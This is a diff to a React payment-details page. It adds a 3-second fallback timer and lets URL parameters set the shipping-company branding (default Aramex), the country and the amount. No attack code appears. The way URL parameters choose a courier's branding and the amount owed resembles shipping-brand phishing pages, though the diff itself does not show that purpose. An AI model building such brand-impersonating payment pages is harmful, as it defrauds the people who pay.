@@ -1,3 +1,4 @@
+import { useState, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
@@ -16,10 +17,24 @@ import PageLoader from "@/components/PageLoader";
 const PaymentDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
-  const { data: linkData, isLoading } = useLink(id);
+  const { data: linkData, isLoading, isError } = useLink(id);
+  const [showPage, setShowPage] = useState(false);
+
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setShowPage(true);
+    }, 3000);
+    return () => clearTimeout(timer);
+  }, []);
+
+  useEffect(() => {
+    if (linkData || isError) {
+      setShowPage(true);
+    }
+  }, [linkData, isError]);
 
   const urlParams = new URLSearchParams(window.location.search);
-  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || urlParams.get('service') || 'aramex';
+  const serviceKey = urlParams.get('company') || urlParams.get('service') || linkData?.payload?.service_key || 'aramex';
   const serviceName = linkData?.payload?.service_name || linkData?.payload?.customerInfo?.service || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
@@ -28,8 +43,9 @@ const PaymentDetails = () => {
   const amountParam = urlParams.get('amount');
   const currencyParam = urlParams.get('currency');
   const methodParam = urlParams.get('method') || urlParams.get('pm');
+  const countryParam = urlParams.get('country');
   
-  const countryCode = shippingInfo?.selectedCountry || "SA";
+  const countryCode = countryParam || shippingInfo?.selectedCountry || "SA";
   const currencyInfo = getCurrencyByCountry(countryCode);
 
   const rawAmount = amountParam || shippingInfo?.cod_amount || shippingInfo?.customerInfo?.amount;
@@ -47,7 +63,7 @@ const PaymentDetails = () => {
 
   const formattedAmount = formatCurrency(amount, currencyParam || countryCode);
 
-  if (isLoading) {
+  if (isLoading && !showPage) {
     return <PageLoader message="جاري تحميل تفاصيل الدفع..." />;
   }
   
